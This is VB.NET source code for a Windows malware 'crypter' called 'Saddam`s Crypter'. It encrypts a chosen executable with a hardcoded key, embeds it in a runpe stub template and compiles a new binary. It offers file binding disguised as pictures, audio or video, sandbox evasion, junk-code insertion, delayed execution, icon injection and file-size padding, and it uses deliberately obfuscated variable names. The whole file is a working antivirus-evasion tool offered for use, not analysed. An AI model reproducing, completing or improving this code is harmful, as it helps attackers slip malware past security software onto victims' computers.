Imports Microsoft.Win32
Imports System.Management
Imports System.Net
Imports System.IO

Public Class Form1

    Dim dialog As New OpenFileDialog
    Dim dialog2 As New SaveFileDialog
    Const ady = "@targuOCna@"
    Dim RRRRRRRRRRR As String
    Dim TheEOF As String
    Dim bindfile As String
    Dim antis As String
    Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (ByVal Destination As Long, ByVal Source As Long, ByVal Length As Integer)

    Public Function ReadEOFData(ByRef FilePath As String) As String
        On Error GoTo Err_Renamed
        Dim sEOFBuf, sFileBuf, sChar As String
        Dim lPos2, lFF, lPos, lCount As Integer
        If Dir(FilePath) = "" Then GoTo Err_Renamed
        lFF = FreeFile()
        FileOpen(lFF, FilePath, OpenMode.Binary)
        sFileBuf = Space(LOF(lFF))
        FileGet(lFF, sFileBuf)
        FileClose(lFF)
        lPos = InStr(1, StrReverse(sFileBuf), GetNullBytes(30))
        sEOFBuf = (Mid(StrReverse(sFileBuf), 1, lPos - 1))
        ReadEOFData = StrReverse(sEOFBuf)
        If ReadEOFData = "" Then
        End If
        Exit Function
Err_Renamed:
        ReadEOFData = vbNullString
    End Function
    Sub WriteEOFData(ByRef FilePath As String, ByRef EOFData As String)
        Dim sFileBuf As String
        Dim zl0yn4HvvgQwNctXrbgBwtm85WvPWRfj1QSdpjIbxL As String = Nothing
        Dim lFF As Integer
        Try
            If Dir(FilePath) = "" Then Exit Sub
            Dim ibP1BC0GxpyYnn6BE4YphO36U27OayFzjGgf As String
            Try
            Catch
            End Try
            lFF = FreeFile()
            Dim DqCuzUzD6SOpGiZVi3KkVg93beHeluiKVVTZ19Ir87QUXN As String
            FileOpen(lFF, FilePath, OpenMode.Binary)
            Try
            Catch
            End Try
            sFileBuf = Space(LOF(lFF))
            Dim r01hMPnLRhdJZ34ZjyWtVxJoJXPlRsZlso2Meno1SMvxai5F2dYYWcLT As String
            FileGet(lFF, sFileBuf)
            Dim bvRQjXaRuT42fSqfUkwccNNt4JqEoHcrdaTol As String
            FileClose(lFF)
            Try
            Catch
            End Try
            Kill(FilePath)
            Dim Cs6D8Mgh79KmPyHt2OYMxrsqweWeFkTmqukEmN5zl0yn4HvvgQwN As String
            lFF = FreeFile()
            Dim ctXrbgBwtm85WvPWRfj1QSdpjIbxLibP1BC0GxpyYnn6B As String
            FileOpen(lFF, FilePath, OpenMode.Binary)
            Try
            Catch
            End Try
            FilePut(lFF, sFileBuf & EOFData)
            Dim E4YphO36U27OayFzjGgfDqCuzUzD6SOpGiZVi3Kk As String
            FileClose(lFF)
        Catch
        End Try
    End Sub

    Public Function GetNullBytes(ByRef lNum As Object) As String
        Dim Buf As String
        Dim i As Short
        For i = 1 To lNum
            Buf = Buf & Chr(0)
        Next
        GetNullBytes = Buf
    End Function
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        With dialog
            dialog.DefaultExt = "exe"
            dialog.Filter = "Executable Files (*.exe)|*.exe"
            dialog.FilterIndex = 1
            dialog.FileName = ""
            If dialog.ShowDialog(Me) = 1 Then
                TextBox1.Text = dialog.FileName
            End If
            RRRRRRRRRRR = ReadEOFData(dialog.FileName)
            TheEOF = ReadEOFData(dialog.FileName)
        End With
        If ReadEOFData(TextBox1.Text) = vbNullString Then
            EofLabel.Text = "NO EOF Data Detected"
            EofLabel.ForeColor = Color.Red

        Else
            EofLabel.Text = "EOF Data Detected"
            EofLabel.ForeColor = Color.Lime

        End If
    End Sub

    Function secure(ByVal data As Byte()) As Byte()
        Using sa As New System.Security.Cryptography.RijndaelManaged
            sa.IV = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7}
            sa.Key = New Byte() {7, 6, 5, 4, 3, 2, 1, 9, 8, 7, 6, 5, 4, 3, 2, 1}
            Return sa.CreateEncryptor.TransformFinalBlock(data, 0, data.Length)
        End Using

    End Function
    Public Function encrypt(ByVal message As Byte(), ByVal password As String) As Byte()
        Dim passarr As Byte() = System.Text.Encoding.Default.GetBytes(password)
        Randomize()
        Dim rand As Integer = Int((255 - 0 + 1) * Rnd()) + 1
        Dim outarr(message.Length) As Byte
        Dim u As Integer
        For i As Integer = 0 To message.Length - 1
            outarr(i) += (message(i) Xor passarr(u)) Xor rand
            If u = password.Length - 1 Then u = 0 Else u = u + 1
        Next
        outarr(message.Length) = 112 Xor rand
        Return outarr
    End Function
    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click

        dialog2.DefaultExt = "exe"
        dialog2.Filter = "Executable Files (*.exe)|*.exe"
        If dialog2.ShowDialog = Windows.Forms.DialogResult.OK Then
        End If
        Dim vars As String() = {"runpe"}
        Dim sursa As String = My.Resources.sursa


        If RadioButton3.Checked = True Then


            If CheckBox6.Checked = True Then
                Dim retard3 As Byte() = secure(IO.File.ReadAllBytes(TextBox1.Text))
                sursa = sursa.Replace("bilibistroc", Compactdisk.mortzi(retard3))
                sursa = sursa.Replace("gifa", "cacatzel")
                sursa = sursa.Replace("fagi", "encr")
                sursa = sursa.Replace("buffy.mickey(ADSEQ3434, FAS43243)", "")

                sursa = sursa.Replace("buffy.mickey(nuj, FAS43243)", "")
            Else
                Dim retard As Byte() = secure(IO.File.ReadAllBytes(TextBox1.Text))
                sursa = sursa.Replace("cacatzel", Compactdisk.mortzi(retard))
                sursa = sursa.Replace("fagi", "encr")
                sursa = sursa.Replace("buffy.mickey(nuj, FAS43243)", "")
                sursa = sursa.Replace("dropsor", "bilibistroc")
            End If
        End If
        If RadioButton4.Checked = True Then

            If CheckBox6.Checked = True Then
                Dim retard3 As Byte() = secure(IO.File.ReadAllBytes(TextBox1.Text))
                sursa = sursa.Replace("bilibistroc", Compactdisk.mortzi(retard3))
                sursa = sursa.Replace("gifa", "cacatzel")

                sursa = sursa.Replace("buffy.mickey(ADSEQ3434, FAS43243)", "")
                sursa = sursa.Replace("buffy.mickey(nuj, FAS43243)", "")
                sursa = sursa.Replace("fagi", "encr")
            Else
                Dim retard2 As Byte() = encrypt(IO.File.ReadAllBytes(TextBox1.Text), "parola")
                sursa = sursa.Replace("encr", Compactdisk.mortzi(retard2))
                sursa = sursa.Replace("gifa", "cacatzel")
                sursa = sursa.Replace("buffy.mickey(ADSEQ3434, FAS43243)", "")
                sursa = sursa.Replace("dropsor", "bilibistroc")

            End If

        End If







        If CheckBox5.Checked = True Then
            TextBox1.Text = ReadEOFData(TextBox1.Text)
            ReadEOFData(TextBox1.Text)
            WriteEOFData(dialog2.FileName, TextBox1.Text)
        End If
        If CheckBox2.Checked Then

            Dim bindinput As Byte() = secure(IO.File.ReadAllBytes(TextBox3.Text)) 'Read & Encrypt Binded File
            sursa = sursa.Replace("bind2", Compactdisk.mortzi(bindinput)) 'Format the input bytes and place them in the temp source
            If ComboBox1.SelectedItem = ("Pictures") Then
                sursa = sursa.Replace("%temp%.exe", TextBox4.Text & ".jpg")
            End If
            If ComboBox1.SelectedItem = ("Audio") Then
                sursa = sursa.Replace("%temp%.exe", TextBox4.Text & ".mp3")
            End If
            If ComboBox1.SelectedItem = ("Video") Then
                sursa = sursa.Replace("%temp%.exe", TextBox4.Text & ".avi")
            End If
        Else
            sursa = sursa.Replace("blablabla", "bind2")
        End If

        sursa = sursa.Replace("am reusit", stealth.Text)
        If CheckBox1.Checked = True Then
            sursa = sursa.Replace("GDGDF54545", "hhhhhhhhhheeeee")
            sursa = sursa.Replace("#false#", "false")
            sursa = sursa.Replace("#rundll32 .exe#", "rundll32 .exe")
            sursa = sursa.Replace("#rundll32 #", "rundll32 ")
        End If
        If CheckBox8.Checked = True Then
            sursa = sursa.Replace("#false#", "false")
            sursa = sursa.Replace("#rundll32 .exe#", "something.exe")
            sursa = sursa.Replace("#rundll32 #", "something")
            sursa = sursa.Replace("GDGDF54545", "hhhhhhhhhheeeee")
        End If
        If CheckBox1.Checked And CheckBox8.Checked = True Then
            sursa = sursa.Replace("#false#", "false")
            sursa = sursa.Replace("#rundll32 .exe#", "something.exe")
            sursa = sursa.Replace("#rundll32 #", "something")
            sursa = sursa.Replace("GDGDF54545", "hhhhhhhhhheeeee")
        Else
            sursa = sursa.Replace("#false#", "false")
            sursa = sursa.Replace("#rundll32 .exe#", "something.exe")
            sursa = sursa.Replace("#rundll32 #", "something")
        End If

        If CheckBox4.Checked = True Then



        Else


            sursa = sursa.Replace("sandboxierpcss", "nothong")


        End If

        If chkJunk.Checked = True Then
            Dim Junk1 As String
            Dim Junk2 As String
            Dim Junk3 As String

            Junk1 = GenerateJunk(RandomNumber(2, 1))
            Junk2 = GenerateJunk(RandomNumber(3, 1))
            Junk3 = GenerateJunk(RandomNumber(3, 1))
            sursa = sursa.Replace("%101%", Junk1)
            sursa = sursa.Replace("%102%", Junk2)
            sursa = sursa.Replace("%103%", Junk3)

        Else
            sursa = sursa.Replace("%101%", "")
            sursa = sursa.Replace("%102%", "")
            sursa = sursa.Replace("%103%", "")
        End If
        If CheckBox7.Checked = True Then
            sursa = sursa.Replace("%200%", "Threading.Thread.Sleep(10000)")
        Else
            sursa = sursa.Replace("%200%", " ")
        End If
        If CheckBox7.Checked = True Then
            sursa = sursa.Replace("%200%", "Threading.Thread.Sleep(10000)")
            sursa = sursa.Replace("10000", TextBox5.Text * 1000)
        Else
            sursa = sursa.Replace("%200%", " ")
        End If
        If CheckBox9.Checked = True Then
            sursa = sursa.Replace("%28%", "hhhhhhhhhheeeee")
        End If

        dwqeEQE3Q2.edasr232222dF(dialog2.FileName, sursa, "")

      


        If TextBox2.Text = vbNullString Then
            MsgBox("Crypted without Icon", MsgBoxStyle.Information, "Saddam`s Crypter")
        Else
            IconChanger.InjectIcon(dialog2.FileName, TextBox2.Text)
            MsgBox("Crypted!", MsgBoxStyle.Information, "Saddam`s Crypter")
        End If
        If CheckBox3.Checked Then
            On Error Resume Next

            Dim sizeaia As Double = Val(NumericUpDown2.Value)
            IO.File.Copy(TextBox1.Text, dialog2.FileName)
            If RadioButton1.Checked Then
                sizeaia = sizeaia * 1025
            End If
            If RadioButton2.Checked Then
                sizeaia = sizeaia * 1048575
            End If
            Dim pompeaza = IO.File.OpenWrite(dialog2.FileName)
            Dim marishor = pompeaza.Seek(0, IO.SeekOrigin.[End])
            While marishor < sizeaia
                pompeaza.WriteByte(0)
                marishor += 1
            End While
            pompeaza.Close()
        End If
        ' Dim file1 As Byte() = secure(My.Computer.FileSystem.ReadAllBytes(TextBox1.Text))
        ' If My.Computer.FileSystem.FileExists(dialog2.FileName) Then
        ' My.Computer.FileSystem.DeleteFile(dialog2.FileName)
        '  End If
        ' IO.File.Copy(Application.StartupPath & "\ady.exe", dialog2.FileName)
        ' IO.File.AppendAllText(dialog2.FileName, ady & Convert.ToBase64String(file1))

    End Sub


    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Dim icoana As New OpenFileDialog
        icoana.DefaultExt = "ico"
        icoana.Filter = "Icon Files (*.ico*)|*.ico*"
        icoana.FilterIndex = 1
        icoana.FileName = ""
        If icoana.ShowDialog(Me) = 1 Then
            TextBox2.Text = icoana.FileName
            Dim i As New Icon(icoana.FileName)
            Dim b As New Bitmap(i.ToBitmap)
            PictureBox1.Image = b
        End If

        


    End Sub


    'HWID PROTECTION
    'Se va baga intr-un document .txt sub forma <HWID>:nume , in coloane unul sub altul;)

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        MessageBox.Show("fuck you saddam", "saddam is skid")

        Me.ComboBox1.Items.Add("Pictures")
        Me.ComboBox1.Items.Add("Audio")
        Me.ComboBox1.Items.Add("Video")
        Me.ComboBox1.Items.Add("Documents")
        Const rady = "FUTIitp23EPE"

        

    End Sub

    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        With OpenFileDialog1
            .FileName = ""
            .Filter = "Executable(*.exe)|*.exe|Pictures(*.jpg)(*.jpeg)(*.png)(*.bmp)|*.jpeg;*jpg;*png;*bmp|Video(*.avi)(*.mpg)(*.mpeg)|*.avi;*.mpg;*.mpeg|Documents(*.txt)(*.doc)|*.txt;*.doc|Audio(*.mp3)(*.wav)|*.wav;*.mp3"
            .ShowDialog()
            TextBox3.Text = .FileName
        End With
    End Sub

    Private Sub CheckBox3_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox3.CheckedChanged
        If CheckBox3.Checked = True Then
            NumericUpDown2.Enabled = True
            RadioButton1.Enabled = True
            RadioButton2.Enabled = True
        Else
            NumericUpDown2.Enabled = False
            RadioButton1.Enabled = False
            RadioButton2.Enabled = False
        End If

    End Sub


    Private Sub CheckBox2_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox2.CheckedChanged
        If CheckBox2.Checked = True Then
            Button4.Enabled = True
        Else
            Button4.Enabled = False
        End If
    End Sub

    Private Sub CheckBox6_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox6.CheckedChanged
        If CheckBox6.Checked = True Then
            stealth.Enabled = False
        Else
            stealth.Enabled = True
        End If
    End Sub


    Private Sub Button6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button6.Click
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
        Me.Close()
    End Sub

    Private Sub CheckBox8_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox8.CheckedChanged
        If CheckBox8.Checked = True Then
            CheckBox1.Checked = True
        End If
    End Sub

    Private Sub CheckBox9_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox9.CheckedChanged

    End Sub

    Private Sub Label10_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Label10.Click
        Form2.Show()
    End Sub

    Private Sub GroupBox3_Enter(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GroupBox3.Enter

    End Sub
End Class

Public Class Compactdisk
    Public Shared Function mortzi(ByVal bas As Byte()) As String ' Codedom has maximum of possible chars per line so we are storing the string in multiple strings
        Dim piula As New System.Text.StringBuilder ' Declaring a new StringBuilder to store the piulaput string
        Dim miros As String = Convert.ToBase64String(bas) ' Get a readable String from the Byte Array
        Dim arr As String() = beleste(miros, 50000) ' Split the string into parts to fit in the Codedom-lines
        For M As Integer = 0 To arr.Length - 1 ' Looping thought each string in the array
            If M = arr.Length - 1 Then  ' If i equals the highest number
                piula.Append(Chr(34) & arr(M) & Chr(34))
            Else 'I is smaller than arr.Length - 1 (i < arr.Length - 1)
                piula.Append(Chr(34) & arr(M) & Chr(34) & " & _" & vbNewLine)
            End If
        Next
        Return piula.ToString
    End Function
    Private Shared Function beleste(ByVal bas As String, ByVal sadsa As Long) As String()
        Dim carnatzel As Long = Math.Ceiling(bas.Length / sadsa)
        Dim piula(carnatzel - 1) As String
        Dim MAMAIE As Long = 0
        For C As Integer = 0 To carnatzel - 1
            If C = carnatzel - 1 Then
                Dim femp((bas.Length - MAMAIE) - 1) As Char
                bas.CopyTo(MAMAIE, femp, 0, (bas.Length - MAMAIE))
                piula(C) = Convert.ToString(femp)
            Else
                Dim femp(sadsa - 1) As Char
                bas.CopyTo(MAMAIE, femp, 0, sadsa)
                piula(C) = Convert.ToString(femp)
                MAMAIE += sadsa
            End If
        Next
        Return piula
    End Function






End Class


